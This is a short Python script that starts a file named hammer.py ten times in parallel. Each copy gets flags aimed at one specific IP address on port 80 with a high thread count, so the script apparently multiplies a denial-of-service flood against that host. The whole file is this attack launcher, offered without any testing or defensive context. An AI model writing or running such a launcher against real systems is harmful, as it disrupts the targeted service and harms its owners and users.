import subprocess
import time
import threading

def run_file(file_path, parameters):
    command = ["python", file_path]
    command.extend(parameters.split())
    subprocess.Popen(command)

def run_multiple_times(file_path, parameters, num_times):
    threads = []
    for _ in range(num_times):
        thread = threading.Thread(target=run_file, args=(file_path, parameters))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

file_path = "/storage/emulated/0/hammer-master/hammer.py"
parameters = "-s 107.154.249.27 -p 80 -t 135"
run_multiple_times(file_path, parameters, 10)